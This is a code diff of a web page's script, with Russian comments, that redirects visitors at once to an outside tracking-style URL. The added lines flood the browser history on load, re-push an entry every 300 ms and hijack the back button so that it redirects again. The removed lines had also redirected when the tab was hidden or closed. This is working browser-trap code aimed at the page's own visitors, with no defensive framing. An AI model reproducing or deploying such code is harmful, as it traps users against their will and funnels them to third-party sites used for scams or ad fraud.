@@ -9,40 +9,31 @@
   <script type="text/javascript">
     const redirectUrl = 'https://itonixr.com/out/9327851?rhd=1&os_version=15.3.0&btz=Europe/Moscow&bto=-180&z=9327851';
 
-    function forceRedirect() {
-      // Пробуем остановить текущую загрузку и сразу редирект
-      try { window.stop(); } catch (e) {}
-      window.location.replace(redirectUrl);
+    function trapHistory() {
+      history.pushState(null, '', window.location.href);
     }
 
-    function trapHistory() {
-      history.pushState({}, '', window.location.href);
+    function redirectToTarget() {
+      window.location.replace(redirectUrl); // Быстрый редирект без добавления в историю
     }
 
     document.addEventListener('DOMContentLoaded', () => {
-      // Мгновенный редирект при открытии
-      forceRedirect();
+      // Моментальный редирект при загрузке
+      redirectToTarget();
 
-      trapHistory();
+      // Наполняем стек истории сразу
+      for (let i = 0; i < 10; i++) {
+        trapHistory();
+      }
 
+      // Перехват кнопки "Назад"
       window.onpopstate = () => {
-        forceRedirect();
+        console.log('User pressed back or tried to close the app');
+        redirectToTarget();
       };
 
-      // Повторяем ловушку, чтобы не успели "выскочить"
+      // Поддерживаем ловушку истории активной
       setInterval(trapHistory, 300);
-
-      // Если страница теряет фокус (крестик, назад, сворачивание) — сразу редирект
-      document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'hidden') {
-          forceRedirect();
-        }
-      });
-
-      // Перехватываем попытки закрытия прямо перед уходом
-      window.addEventListener('beforeunload', () => {
-        forceRedirect();
-      });
     });
   </script>
 </head>
